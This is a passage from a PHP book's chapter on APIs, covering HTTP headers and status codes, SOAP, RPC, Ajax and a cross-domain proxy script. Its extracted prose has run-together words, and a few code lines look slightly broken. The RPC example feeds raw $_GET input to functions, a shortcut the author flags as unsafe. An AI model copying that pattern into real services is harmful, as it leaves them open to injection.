Generic “don’t under stand” message fr om the server Bad Request 400
You need to supply some cr edentials to access this Not Authorized 401
You have supplied cr edentials, but do not have access
rightsForbidden 403
There’s nothing at this URL Not Found 404
The server cannot supply content which fits with the
Accept header s in the r equestNot Acceptable 406
Server Err or 5xx
For PHP applications, something went wr ong in PHP and
didn’t give Apache any information about whatInternal Server Err or 500
Usually a tempor ary err or message shown by an API Service Unavailable 503
When wework with APIs, we’ll make ahabit ofchecking thestatus code ofare-
sponse.89 APIs
www.it-ebooks.info
Incorr ect Status Codes in APIs
Although thischapter covers thecorrect theory ofusing status codes, itisn’t at
allunusual tofind APIs intherealworld thatsimply ignore thisandreturn200
OKforeverything. This ispoor practice; however ,youarelikely tocome across
thisasyouintegrate against third-party APIs.
Aswemove through thischapter ,looking atpublishing ourown services, we’ll
include appropriate response headers anddiscuss, particularly forRESTful services,
how tochoose ameaningful value forthestatus code.
HTTP Headers
There isavast array ofHTTP headers thatcanbeused,4andthey differ according
totherequests andresponses. Inthissection, we’ll take alook atthemost common
ones andtheinformation thatthey carry ,andseehow wecanread andwrite
headers from ourPHP applications. We’ve already seen examples oftheheaders in
both request andresponse when wefirst introduced HTTP ,buthow does PHP
manage these? Like this:
// Get the headers from $_SERVER
echo "Accept: " . $_SERVER['HTTP_ACCEPT'] . "\n";
echo "Verb: " . $_SERVER['REQUEST_METHOD'] . "\n";
// send headers to the client:
header('Content-Type: text/html; charset=utf8');
header('HTTP/1.1 404 Not Found');
You’ll seethisandsimilar code used throughout theexamples inthischapter .We
cangetinformation about therequest—including accept headers, andthehost ,
path ,andGETparameters—from thesuperglobal $_SERVER .Wecanreturn headers
totheclient simply using theheader() function, which isfreeform.
Super globals in PHP
Youaredoubtlessly familiar with the$_GET and$_POST variables available in
PHP.These aresuperglobals ,which means thatthey arevariables initialized and
4http://en.wikipedia.org/wiki/HTTP_headersPHP Master: W rite Cutting-edge Code 90
www.it-ebooks.info
populated byPHP,andavailable inevery scope.$_SERVER isanother example,
andcontains agreat deal ofuseful information about arequest.
Headers must bethefirstthing sent toaclient; wecan’t start sending thebody ofa
page, then realize weneed tosend aheader! Sometimes, though, ourapplication
logic does work thisway andwecanbepartway through ascript before weknow
weneed tosend aheader .Forexample, we’d need tobeacertain way through the
script torealize thatauser isn’t logged inandshould besent tothelogin page. We
would redirect auser with astatement such as:
header('Location: login.php');
However ,youwill seeanerror ifyoucallthisfunction after anycontent hasbeen
returned. Ideally ,we’d want tomake sure thatwesend allheaders before wesend
output, butsometimes thatisn’t easy.Allisnotlost, though, aswecanuseoutput
buffering toqueue upthecontent andlettheheaders gofirst.
Output buffering canbeenabled inyour PHP script usingob_start() ,orturned
onbydefault using thephp.ini settingoutput_buffering .Enabling theoutput buffer
causes PHP tostart storing theoutput ofyour script rather than sending ittothe
client immediately .When youreach theendofyour script, orifyoucallthe
ob_flush() function, PHP will then send thecontent totheclient.
Ifyouturn onoutput buffering andstart sending output, andthen later send a
header ,theheader will besent before thebody when thebuffer isemptied outto
theclient. This allows ustoavoid issues where output occurs earlier inthecode
than aheader being sent.
Wealready mentioned some common headers inpassing, butlet’shave amore
formal look attheheaders wemight useinourapplications, inTable 3.3.91 APIs
www.it-ebooks.info
Table 3.3. Commonly used HTTP headers
Used for Direction Header
Stating what format the client would pr efer the
response inRequest Accept
Describing the format of the r esponse Response Content-Type
Indicating which encodings the client supports Request Accept-Encoding
Describing the encoding of the r esponse Response Content-Encoding
Listing languages in or der of pr eference Request Accept-Language
Describing the language of the r esponse body Response Content-Language
Size of the r esponse body Response Content-Length
Sending cookie data in the r esponse for use with
later r equestsResponse Set-Cookie
Cookie data fr om earlier r esponses being sent
with a r equestRequest Cookie
Stating until which point the content is valid Response Expires
Accessing cr edentials for pr otected r esour ces Request Authorization
This isbynomeans anexhaustive list,although ifyou’d liketoseemore detail,
there’ sagreat listonWikipedia.5Instead, thisoutlines some oftheheaders we’ll
beusing onaregular basis, andinparticular thatwe’ll becovering inthischapter .
Webservices willbring usintocontact with twoheaders onaregular basis:Accept
andContent-Type .
Accept  and Content-Type
These twoheaders pairtogether ,despite their unrelated names, toperform content
negotiation between theclient andtheserver .Content negotiation isliterally nego-
tiating over what format ofcontent will beserved intheresponse. Tobegin with,
theclient makes arequest totheserver ,andincludes theAccept header todescribe
what kinds ofcontent itcanunderstand. It’spossible tospecify which formats are
preferred, too,asshown inthisAccept header from Firefox:6
5http://en.wikipedia.org/wiki/HTTP_headers
6This isastandard accept header from Firefox 5,which isanice example.PHP Master: W rite Cutting-edge Code 92
www.it-ebooks.info
Accept: text/html,application/xhtml+xml,application/xml; ➥
q=0.9,*/*;q=0.8
Here, weseeaseries ofcomma-separated values, andsome ofthese also contain
thesemicolon andaqvalue. Sowhat dothese indicate? Infact, theformats without
aqvalue arethepreferred formats, soifaserver canprovide HTML orXHTML, it
should dothat. Ifnot,wefallback tolesspreferred formats. Thedefault is1,and
wedecrease from there, soournext best option istoserve XML. Iftheserver is
unable tomanage thateither ,the*/*indicates thatitshould send whatever ithas,
andtheclient will dowhat itcanwith theresult.
Still with us?TheAccept header forms part oftherequest header ,andtheserver
receives that, works outwhat format toreturn, andsends theresponse back with a
Content-Type header .TheContent-Type header tells theclient what format the
body oftherequest isin.Weneed thissothatweknow how tounderstand it!Oth-
erwise, we’ll bewondering whether todecode theJSON, parse theXML, ordisplay
theHTML. TheContent-Type header ismuch simpler ,since there’ snoneed to
provide achoice:
Content-Type: text/html
Content T ypes and Err ors
Asarule, weshould always return responses intheformat inwhich they areex-
pected. It’sacommon mistake toreturn errors from web services inHTML or
some other format, when theservice usually returns JSON. This isconfusing for
clients who may beunable toparse theresult. Therefore, always besure toreturn
inthesame format, andsettheContent-Type headers correctly forallresponses.
Ingeneral, these headers arenotalways well-supported orwell-understood. However ,
they arethebest way ofmanaging content negotiation ontheWeb,andarerecom-
mended practice fordoing so.
HTTP V erbs
When wewrite forms fortheWeb,wehave achoice between theGETmethod and
thePOST method. Here’ sabasic form:93 APIs
www.it-ebooks.info
<form action="form.php" method="get">
  Name: <input type="text" name="name" />
  <input type="submit" value="Save" />
</form>
When wesubmit theform, theHTTP request thatcomes into theserver looks like
this:
GET /form.php?name=Lorna HTTP/1.1
User-Agent: Opera/9.80 (X11; Linux i686; U; en-GB) Presto/2.7.62 ➥
  Version/11.00
Host: localhost
Accept: text/html, application/xml;q=0.9, application/xhtml+xml, ➥
  image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1
Accept-Language: en-GB,en;q=0.9
Accept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1
Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0
Referer: http://localhost/form.php
Ifwechange themethod toPOST ,therequest changes subtly:
POST /form.php HTTP/1.1
User-Agent: Opera/9.80 (X11; Linux i686; U; en-GB) Presto/2.7.62 ➥
  Version/11.00
Host: localhost
Accept: text/html, application/xml;q=0.9, application/xhtml+xml, ➥
  image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1
Accept-Language: en-GB,en;q=0.9
Accept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1
Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0
Referer: http://localhost/form.php
Content-Length: 10
Content-Type: application/x-www-form-urlencoded
name=Lorna
Instead ofbeing ontheURL, thedata appears inthebody oftherequest, with the
Content-Type setaccordingly .
Working with web services, we’ll seeavariety ofverbs used; most ofthetime we’re
usingGETandPOST exactly aswedowhen wework with forms, andeverything you
already know about submitting data stillstands tobeuseful. Theother commonPHP Master: W rite Cutting-edge Code 94
www.it-ebooks.info
verbs used areinaRESTful service, where weuseGET,POST ,PUT,andDELETE to
provide uswith theability tocreate, select, update, anddelete data. There ismore
about REST later oninthischapter .
Understanding and Choosing Service T ypes
You’ll have heard ofanumber ofbuzzwords fordifferent types ofprotocol. Let’s
have alook atthese terms andwhat they mean:
RPC Theacronym stands forRemote Procedure Call. What we’re really saying
here isthatanRPC service isonewhere youcallafunction andpass para-
meters. You’ll seeservices described asXML-RPC orJSON-RPC totellyou
what data format they use.
SOAP This once stood forSimple Object Access Protocol, butsince SOAP isany-
thing butsimple, itwasdropped. Nevertheless, SOAP isatightly defined,
specific subset ofXML-RPC. It’saverbose XML format, andmany program-
ming languages have built-in libraries thatcanhandle SOAP easily—includ-
ingPHP,which we’ll seelater.SOAP services areoften described byaWSDL
(WebService Description Language) document—a setofdefinitions describ-
ingaweb service .
REST Unlike theprevious two, REST isn’t aprotocol. Itsexact interface anddata
formats areundefined; it’smore ofasetofdesign principles. REST considers
every item tobearesource, andactions areperformed bysending thecorrect
verb totheURL forthatresource. Keep reading, asthere’ sasection dedicated
toREST later inthischapter .
PHP and SOAP
Since PHP 5,we’ve hadagreat SOAP extension inPHP thatmakes both publishing
andconsuming SOAP services very quick andeasy.Toillustrate this, we’ll build
aservice andthen consume it.First, weneed tocreate some functionality forour
service toexpose, sowe’ll make aclass thatdoes acouple ofsimple tasks:
chapter_03/Ser viceFunctions.php
class ServiceFunctions 
{
  public function getDisplayName($first_name, $last_name) {95 APIs
www.it-ebooks.info
    $name = '';
    $name .= strtoupper(substr($first_name, 0, 1));
    $name .= ' ' . ucfirst($last_name);
    return $name;
  }
  public function countWords($paragraph) {
    $words = preg_split('/[. ,!?;]+/',$paragraph);
    return count($words);
  }
}
Asyoucansee,there’ snothing particularly groundbreaking here, butitdoes give
ussome methods tocallwith parameters, andsome return values toaccess, which
isallweneed fornow.Yourown examples will bemuch more interesting!
Tomake thisavailable asaSOAP service, we’ll usethefollowing code:
include 'ServiceFunctions.php';
$options = array('uri' => 'http://localhost/');
$server = new SoapServer(NULL, $options);
$server->setClass('ServiceFunctions');
$server->handle();
Wereyouexpecting more? This isgenuinely allthat’srequired. TheSoapServer
class simply needs toknow where tofind thefunctions thattheservice exposes,
andthecalltohandle() tells ittogoandcalltherelevant method. This example
uses non-WSDL mode (more onWSDLs inamoment), andsowesimply setthe
URIintheoptions array .
Wecannow consume theservice with some similarly straightforward code, which
makes useoftheSoapClient class:
$options = array(
  'uri' => 'http://localhost', 
  'location' => 'http://localhost/soap-server.php', 
  'trace' => 1);
$client = new SoapClient(NULL, $options);
echo $client->getDisplayName('Joe', 'Bloggs');PHP Master: W rite Cutting-edge Code 96
www.it-ebooks.info
/* output:
J Bloggs
*/
Again, thisisquite short andsweet—in fact, most ofthecode isused tosetthe
entries inthe$options array! WesettheURItomatch theserver ,andspecify where
thelocation canbefound. Wealso have thetrace option enabled, which means we
canusesome debugging functions. Weinstantiate theclient, andthen callthe
functions intheServiceFunctions class exactly asifitwere alocal class ,despite
theSoapServer being onaremote server andthemethod callactually going viaa
web request.
Thedebugging functions available tousare:
■getLastRequest()
■getLastRequestHeaders()
■getLastResponse()
■getLastResponseHeaders()
They show either theXML body ortheheaders oftherequest orresponse, andenable
ustocheck thatwe’re sending what weexpected tosend, aswell astheformat of
theresponse before itwasparsed (this isvery useful forthose moments where debug
orunexpected output hasbeen leftinontheserver side!).
Describing a SOAP Service with a WSDL
Theexample above used SOAP inanon-WSDL mode, butitismore common, and
perhaps simpler ,touseaWSDL with SOAP services. WSDL stands forWebService
Description Language, andit’sbasically amachine-readable specification. AWSDL
describes atwhich URL aservice islocated, which methods areavailable, andwhat
parameters each method takes.
PHP can’t generate WSDLs itself, andanaccurate WSDL willalsoinclude informa-
tion about data types, which ofcourse welack inPHP.Most ofthetools will take
into account anyPHPDocumentor comments thatyouaddregarding data types for
parameters, however ,which does help. Some IDEs have built-in tools thatcancreate97 APIs
www.it-ebooks.info
aWSDL from aPHP class; alternatively ,there isaWSDL generator available from
phpclasses.org.7Here’ stheWSDL forourexample class:
chapter_03/wsdl.xml
<?xml version='1.0' encoding='UTF-8'?>
<definitions name="SimpleWSDL" targetNamespace="urn:SimpleWSDL" 
xmlns:typens="urn:SimpleWSDL" xmlns:xsd="http://www.w3.org/2001/ ➥
  XMLSchema" 
xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/" 
xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" 
xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/" 
xmlns="http://schemas.xmlsoap.org/wsdl/">
  <message name="countWords"><part name="paragraph" 
type="xsd:anyType"></part></message>
  <message name="countWordsResponse"></message>
  <message name="getDisplayName"><part name="first_name" 
type="xsd:anyType"></part><part name="last_name" 
type="xsd:anyType"></part></message>
  <message name="getDisplayNameResponse"></message>
  <portType name="ServiceFunctionsPortType">
    <operation name="countWords"><input 
message="typens:countWords"></input><output 
message="typens:countWordsResponse"></output></operation>
    <operation name="getDisplayName"><input 
message="typens:getDisplayName"></input><output 
message="typens:getDisplayNameResponse"></output></operation>
  </portType>
  <binding name="ServiceFunctionsBinding" 
type="typens:ServiceFunctionsPortType"><soap:binding style="rpc" 
transport="http://schemas.xmlsoap.org/soap/http"></soap:binding>
    <operation name="countWords">
      <soap:operation soapAction="urn:ServiceFunctionsAction"> ➥
        </soap:operation>
      <input><soap:body namespace="urn:SimpleWSDL" use="encoded" 
encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"> ➥
  </soap:body></input>
      <output><soap:body namespace="urn:SimpleWSDL" use="encoded" 
encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"> ➥
  </soap:body></output>
    </operation>
    <operation name="getDisplayName">
      <soap:operation soapAction="urn:ServiceFunctionsAction"> ➥
7http://www .phpclasses.org/php2wsdlPHP Master: W rite Cutting-edge Code 98
www.it-ebooks.info
        </soap:operation>
      <input><soap:body namespace="urn:SimpleWSDL" use="encoded" 
encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"> ➥
  </soap:body></input>
      <output><soap:body namespace="urn:SimpleWSDL" use="encoded" 
encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"> ➥
  </soap:body></output>
    </operation>
  </binding>
  <service name="SimpleWSDLService">
    <port name="ServiceFunctionsPort" 
binding="typens:ServiceFunctionsBinding"><soap:address location= ➥
  "http://localhost/soap-
server.php"></soap:address></port>
  </service>
</definitions>
Asyoucansee,thisisvery definitely aimed atatarget audience ofmachines, rather
than humans. Happily ,thetools cangenerate theWSDL forus,andwecanusethis
topublish ourservice. InWSDL mode, wecancreate aclient even more quickly:
ini_set('soap.wsdl_cache_enabled', 0);
$client = new SoapClient('http://localhost/wsdl');
Then wecangoonandcallthefunctions againstSoapClient exactly asbefore.
WiththeWSDL, however ,wehave some additional functions. TheSoapClient
object isaware ofthefunctions available andwhich parameters canbepassed; this
means thatitcancheck wearesending sensible requests before weeven send them.
There’ salso amethod,__getFunctions() ,which cantelluswhich methods are
available ontheremote service. We’dcallthatusing thispiece ofcode:
$functions = $client->__getFunctions();
var_dump($functions);
TheSoapClient reads theWSDL, andgives usinformation about thefunctions in
thisservice inaformat that’smore useful tousthan therawWSDL XML.99 APIs
www.it-ebooks.info
Debugging HTTP
Now thatwe’ve seen onetype ofservice, itseems likeagood time tolook atsome
tools andstrategies forworking with HTTP ,andtroubleshooting web services ifwe
need to.
Using Logging to Gather Information
It’scommon practice todebug aweb application byadding someecho andprint_r
statements intothecode, andobserving theoutput. This becomes trickier when we
work with web services because we’re serving prescriptive data formats thatwill
become invalid ifweaddunexpected output into them. Todiagnose issues when
weserve APIs, it’sbetter tologerrors, using aprocess along these lines:
1.Adderror_log() entries (orframework-specific error logging, asappropriate)
into your server code.
2.Make acalltotheweb service, either from PHP orsimply using cURL.
3.Check thelogfiles toview thedebugging output youadded.
Tailing Log Files
It’srather tedious tokeep repeating theabove process, butitcanbemade easier
ifyoutailthelogfile.This means leaving thefileopen andviewed, sothatall
new entries tothefileappear onscreen. OnaUnix-based system, youcanachieve
thiswith thecommand: tail -f <logfile> .
Using thistechnique, youcancheck variables andmonitor progress ofyour web
server script without breaking theformat oftheoutput returned.
Inspecting HTTP T raffic
This strategy isoneofourfavorites; theidea isthatwehave alook attherequest
andresponse messages without making anychanges totheapplication code. There
aretwomain tools thatarecommonly used: Wireshark8andCharles Proxy .9Al-
though they work indifferent ways, both perform thebasic function ofshowing us
therequests thatwesend andreceive.
8http://www .wireshark.org/
9http://www .charlesproxy .comPHP Master: W rite Cutting-edge Code 100
www.it-ebooks.info
This allows ustoobserve thattherequest iswell-formed andincludes allthevalues
thatweexpected. Wecanalsoseetheresponse, check headers andstatus code, and
verify thatthecontent ofthebody makes sense. Itisoften atthisstage thattheplain-
texterror message canbespotted!
Themain advantage ofthese approaches isthatwedonotmake changes toanypart
oftheapplication inorder toadddebugging. When weobserve aproblem, westart
inspecting traffic, andsimply repeat thesame request again.
Inspecting T raffic on Remote Servers
Wementioned thetoolWireshark, which works bytaking acopy ofthedata that
goes over your network card. This isconvenient ifyou’re making requests from
alaptop machine, butnotsouseful onaserver .However ,Wireshark canalso
understand theoutput oftheprogramtcpdump ,soyoucancapture traffic onthe
server andthen useWireshark toview itinanapproachable way.
RPC Services
Asstated earlier ,RPC stands forRemote Procedure Call, which istosayit’saservice
where wecallafunction onaremote machine. RPC services canoften belightweight
andsimple towork with. Asdevelopers, we’re allaccustomed tocalling functions,
passing inparameters, andgetting areturn value back. RPC services follow exactly
thispattern, andsothey areafamiliar wayofusing webservices, even fordevelopers
with noprior experience.
We’ve already seen some examples involving SOAP; SOAP isactually aspecial
case ofanXML-RPC service. Theservice hasasingle endpoint, andwedirect a
function calltoit,supplying anyparameters thatweneed to.RPC services canuse
anykind ofdata format, andareingeneral quite loosely specified. They’re agood
choice when thefeatures tobeexposed over theservice arefunction-based, such
aswhen anexisting library istobeexposed foruseover HTTP .
Consuming an RPC Service: Flickr Example
Flickr hasagreat setofweb services, andhere we’ll make some calls toitsXML-
RPC service asanexample ofhow tointegrate against this, oraservice likeit.The101 APIs
www.it-ebooks.info
documentation forFlickr’ sAPIisthorough;10we’ll now look specifically atits
method togetalistofphotos from agroup.
First ofall,we’ll prepare theXML tosend. This includes thename ofthefunction
we’ll call, andthenames andvalues oftheparameters we’re going topass. Here,
we’re using theelePHPant pool onFlickr asanexample:
<?xml version="1.0"?>
<methodCall>
  <methodName>flickr.groups.pools.getphotos</methodName>
  <params>
    <param>
      <value>
        <struct>
          <member>
            <name>api_key</name>
            <value>secret-key</value>
          </member>
          <member>
            <name>group_id</name>
            <value>610963@N20</value>
          </member>
          <member>
            <name>per_page</name>
            <value>5</value>
          </member>
        </struct>
      </value>
    </param>
  </params>
</methodCall>
Wehope thisiseasy enough tofollow ,with themethodName tosaywhich method
we’re calling andthen variousparams added tothecall. Ifyouhave anaccount on
Flickr ,youcangetanAPIkeyfrom your account page.
Allcalls totheFlickr APIaredone viaPOST ,sowecanusethiscalltopass theXML
toFlickr .WiththeXML stored inthevariable$xml ,here’ sanexample ofmaking
thecallandpulling thedata outoftheresulting response:
10http://www .flickr .com/services/api/flickr .groups.pools.getPhotos.htmlPHP Master: W rite Cutting-edge Code 102
www.it-ebooks.info
$url = 'http://api.flickr.com/services/xmlrpc/';
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $xml);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$response = curl_exec($ch);
$responsexml = new SimpleXMLElement($response);
$photosxml = new SimpleXMLElement(
  (string)$responsexml->params->param->value->string);
print_r($photosxml);
There areafewthings going onhere, butwe’ll walk through thescript andexamine
each piece. First, weinitialize ainitialize acURL handle topoint toFlickr’ sAPI
alsospecify thatthiswillbeaPOST request, thatthedata topost isin$xml ,andthat
theresponse should bereturned rather than echoed.
Then wemake thecalltotheweb service, andsince we’ll have anXML response,
weimmediately create aSimpleXMLElement from theresponse. TheSimpleXMLEle-
ment parses theresulting XML intoastructure wecaneasily use,sowecanretrieve
themain part oftheresponse thatwe’re interested in.Every child element ofa
SimpleXMLElement isalso aSimpleXMLElement ,buthere wewant tojustusethe
XML string, sowecastittoastring.
Finally ,weparse theXML weretrieved from theweb service response. When we
inspect itwithprint_r() ,wefind thatthere’ saSimpleXMLElement containing one
item with allthedata fields asattributes. Soforthenames ofthephotos, wecando
this:
foreach($photosxml->photo as $photo) {
  echo $photo['title'] . "\n";
}
Note theuseofarray notation fortheattributes oftheSimpleXMLElement rather than
object notation, which isused tofetch thechildren ofanobject.103 APIs
www.it-ebooks.info
Building an RPC Service
Wecanbuild avery simple RPC service quite fast. Remember theclass thatweused
forourSOAP example? Here itisagain:
class ServiceFunctions 
{
  public function getDisplayName($first_name, $last_name) {
    $name = '';
    $name .= strtoupper(substr($first_name, 0, 1));
    $name .= ' ' . ucfirst($last_name);
    return $name;
  }
  public function countWords($paragraph) {
    $words = preg_split('/[. ,!?;]+/',$paragraph);
    return count($words);
  }
}
ForanRPC service, weneed users tosaywhich method they want tocall, solet’s
require anincoming parameter method. Forsimplicity ,we’ll assume thatusers want
aJSON response. Sohere’ sasimple index.php example forthisservice:
chapter_03/index.php
require 'servicefunctions.php';
if(isset($_GET['method'])) {
  switch($_GET['method']) {
    case 'countWords':
      $response = ServiceFunctions::countWords($_GET['words']);
      break;
    case 'getDisplayName':
      $response = ServiceFunctions::getdisplayName ➥
        ($_GET['first_name'], $_GET['last_name']);
      break;
    default:
      $response = "Unknown Method";
      break;
  }
} else {
  $response = "Unknown Method";
}PHP Master: W rite Cutting-edge Code 104
www.it-ebooks.info
header('Content-Type: application/json');
echo json_encode($response);
This illustrates thepoint thatweb services arenotrocket science rather well! We
simply take themethod parameter ,andifit’savalue wewere expecting, callthe
method intheServiceFunctions class accordingly .Once we’ve done that, orwe
receive anerror message, weformat theoutput asJSON andreturn it.
Having theoutput formatting asthelastitem inthescript means thatitwould be
simple torefactor thissection toreturn different formats inresponse totheuser’ s
Accept header oranincoming format parameter .Agood APIwillsupport different
outputs, andastructure similar tothis—where even error messages allgothrough
thesame output process—is agreat meofachieving theflexibility toencode the
output indifferent ways.
APIs and Security
Oneofthemost striking points about thiscode sample istheuseof$_GET variables
asparameters tofunctions without anysecurity additions atall.This ispurely to
keep theexample simple; however ,itwould bevery risky topublish code like
thisonapublic API! Security forAPIs isexactly thesame asforanyother applic-
ation. Filter your input, escape your output, andcheck Chapter 5formore inform-
ation onthistopic.
Toconsume these methods over theAPI, wecansimply request thefollowing URLs:
http://localhost/json-rpc.php?method=getdisplayName&first_name= ➥
     Jane&last_name=Doe
// outputs: "J Doe"
http://localhost/json-rpc.php?method=countWords&words= ➥
     Mary%20had%20a%20little%20lamb
// outputs: 5
Notice thatweareURL-encoding ourparameters when wepass these intotheservice.
OurRPC example usesGETrequests. These aresimple toform andtest, andeasy to
understand. Since ourexamples aresotiny,it’saperfectly good choice. Many RPC105 APIs
www.it-ebooks.info
services usePOST data, andthisisabetter choice when working with larger data
sets, asthere’ salimit onthesizethataURL canbe,andthisdiffers between systems.
Themain point tonote isthatRPC isquite aloose umbrella term, andyouwill
implement theservice differently—depending onwho orwhat will beusing the
service, andonthedata thatneeds tobetransmitted.
Ajax and W eb Services
Most ofthetime wethink ofAjax asanice little toolwecanusetodynamically fill
inbitsofdata without reloading thepage. Sometimes you’ll return XML (rarely),
while atother times you’ll return JSON (sometimes); alotofthetime youwillsimply
return HTML snippets toplug directly into thepage.
When wepair Ajax with anAPI, wecantake ournice little toolandturn itinto an
integral part ofoursite’sarchitecture; thisisanexample oftheSOA wecovered in
thesection called “Service-oriented Architecture” .When webuild anAPIforour
users toaccess oursite’sdata, there’ snoreason why thatsame siteshouldn’t use
Ajax toretrieve data using thatvery same API.
Bewar e the Same Origin P olicy
Allbrowsers implement asecurity feature called theSame Origin Policy .This is
asecurity feature thatstops Ajax requests being performed against adomain other
than theoneused bythewebsite. Forexample, from johnsfarmwidgets.org you
cannot useAjax todirectly hittwitter .com topull inyour tweets. Inorder toget
around this, youcanimplement aproxy script; there’ sanexample showing how
todothisinthenext section.
Let’slook atanevent calendar asanexample. First, we’ll create asmall table that
indicates upon which days ofthemonth events occur:
chapter_03/calendar_table.php
<!-- Set an ID of calendar -->
<table id="calendar" cellpadding="0" cellspacing="0">
  <tr>
    <!-- Show the current Month -->
    <th colspan="7">May 2011</th>
  </tr>PHP Master: W rite Cutting-edge Code 106
www.it-ebooks.info
  <tr>
    <!-- Days of the Week -->
    <th>S</th>
    <th>M</th>
    <th>T</th>
    <th>W</th>
    <th>T</th>
    <th>F</th>
    <th>S</th>
  </tr>
  <!-- Days -->
  <tr>
    <td>1</td>
    <td>2</td>
    <td>3</td>
    <td>
      <!-- Link to each event on the appropriate day -->
      <a href="/events/189">4</a>
    </td>
    <td>5</td>
    <td>6</td>
    <td><a href="/events/194">7</a></td>
  </tr>
  <tr>
    <td>8</td>
    <td>9</td>
    <td><a href="/events/234">10</a></td>
    <td>11</td>
    <td>12</td>
    <td>13</td>
    <td>14</td>
  </tr>
  <tr>
    <td>15</td>
    <td>16</td>
    <td>17</td>
    <td>18</td>
    <td>19</td>
    <td><a href="/events/300">20</a></td>
    <td>21</td>
  </tr>
  <tr>
    <td>22</td>
    <td>23</td>
    <td>24</td>107 APIs
www.it-ebooks.info
    <td>25</td>
    <td>26</td>
    <td>27</td>
    <td>28</td>
  </tr>
  <tr>
    <td>29</td>
    <td>30</td>
    <td><a href="/events/1337">31</a></td>
    <td colspan="4">
        <!-- Fill in the leftover days with blanks -->
    </td>
  </tr>
</table>
Nothing tooexciting here, right? Users canjustclick thelink andgotoapage with
relevant information fortheevent. This table, with some CSS help, isdepicted in
Figure 3.2.
Figur e 3.2. Our table tr ansformed
However ,with justalittle sprinkling ofJavaScript, using Ajax andourAPI, wecan
enhance theexperience forourusers greatly .PHP Master: W rite Cutting-edge Code 108
www.it-ebooks.info
Progressive Enhancement
Progressive enhancement isatechnique forensuring your pages areaccessible.
Byusing arealtable with reallinks thatgotorealpages with realrelevant
data—and then using JavaScript toturn those links into Ajax requests—we can
ensure thateven auser without JavaScript turned on(perhaps aperson using a
screen reader ,orasearch bot)canstillreach therelevant content.
Inthiscode, after thedocument hasfinished loading (and therefore ourtable markup
isready tobemanipulated), wesimply attach anonclick event thatwill perform
anAjax request tothelink’shref value; because ofcontent negotiation, itreturns
aJSON data structure instead ofthefullHTML page. Wecanthen show theresulting
JSON data inatooltip. This allows ourusers toquickly review many events without
reloading thepage.
One such JSON response might be:
{title: "Davey Shafik's Birthday!", date: "May 31st 2011"}
Inthisexample, we’re using thejQuery library; however ,youcanachieve thesame
with almost anyJavaScript library ,orwith plain JavaScript:
chapter_03/calendar_js.php
<script type="text/javascript">
  // Wait till the document has loaded
  $(function() {
    // For all anchors inside our table cells, add an onclick event
    $('#calendar td a').click(
      function (event) { 
        // Stop the link from triggering
        event.preventDefault();
        // Stop the body click from triggering
        event.stopPropagation();
        
        // Remove existing tooltips:
        $('#calendar td div').remove();
        
        // Create a simple container for our data
        var tooltip = $('<div/>').css("position", "absolute"). ➥
          addClass('tooltip');109 APIs
www.it-ebooks.info
        // Perform the AJAX request to the anchors link
        $.AJAX({
          url: this.href,
          success: function(data) {
            // On success, add the data inside our tooltip
            tooltip.append("<p><b>Event:</b> " + data.title + ➥
              "<br /> <b>Date:</b> " +data.date+ "</p>");
            // Add the tooltip to the table cell
            this.parent().append(tooltip);
          }
        });
      }
    );
    
    // Add an onclick to the body to remove existing tooltips so ➥
      the user can move on by clicking anywhere
    $('body').click(function() {
      $('#calendar td div').remove();
    });
  });
</script>
Clicking onadate will update thepage tolook asitdoes inFigure 3.3.
Figur e 3.3. Updated table with birthday event in a tooltipPHP Master: W rite Cutting-edge Code 110
www.it-ebooks.info
Reusing your own public APImakes alotofsense, foranumber ofreasons:
■ensures thatyour APIiseasy touse, andreturns sensible, usable data
■avoids duplication ofcode
■provides consumers ofyour public APIwith aworking example
Cross-domain Requests
One ofthecommon problems when trying touseAjax isthatthebrowser will pro-
hibit youfrom making requests toanydomain other than theonefrom which the
request ismade—the Same Origin Policy .There aremany ways togetaround this,
such asusingiframes orpulling inJSON using dynamically generated <script>
tagswith aremote server asthesrc;however ,themost robust andsecure istheuse
ofaserver -side proxy that’shosted onthesame domain which theAjax request is
being made from. This proxy script will accept therequest andforward ittothe
remote server ,andthen return theresult tothebrowser .
Anadded benefit totheproxy isthatyoucantransform theresult from theremote
service intoadata structure thatbetter suits your needs; forexample, convert XML
into JSON.
Bewar e Security Risks!
Themost common security riskassociated with thecross-domain proxy isfailing
tolimit which remote servers therequests canbemade to.This allows anattacker
topull incontent code from their own servers thatcontains malicious code, orin
some other way damages theserver and/or itsusers.
Sowhat does thisproxy script look like? Bigandscary ,right? Wrong. Well,maybe
alittle:
chapter_03/proxy .php (excerpt)
// An array of allowed hosts with their HTTP protocol (i.e. http ➥
  or https) and returned mimetype
$allowed_hosts = array(
                  'api.bit.ly' => array(
                      "protocol" => "http",
                      "mimetype" => "application/json",
                      "args" => array(111 APIs
www.it-ebooks.info
                          "login" => "user",
                          "apiKey" => "secret",
                      )
                   )
                );
// Check if the requested host is allowed, PATH_INFO starts with a /
$requested_host = parse_url("http:/" .$_SERVER['PATH_INFO'], ➥
  PHP_URL_HOST);
if (!isset($allowed_hosts[$requested_host])) {
  // Send a 403 Forbidden HTTP status code and exit
  header("Status: 403 Forbidden");
  exit;
}
// Create the final URL
$url = $allowed_hosts[$requested_host]['protocol'] . ':/' . ➥
  $_SERVER['PATH_INFO'];
if (!empty($_SERVER['QUERY_STRING'])) {
  // Construct the GET args from those passed in and the default
  $url .= '?' .http_build_query($_GET + ($allowed_hosts ➥
    [$requested_host]['args']) ?: array());
}
// Instantiate curl
$curl = curl_init($url);
// Check if request is a POST, and attach the POST data
if ($_SERVER['REQUEST_METHOD'] == "POST") {
  $data = http_build_query($_POST);
  curl_setopt ($curl, CURLOPT_POST, true);
  curl_setopt ($curl, CURLOPT_POSTFIELDS, $data);
}
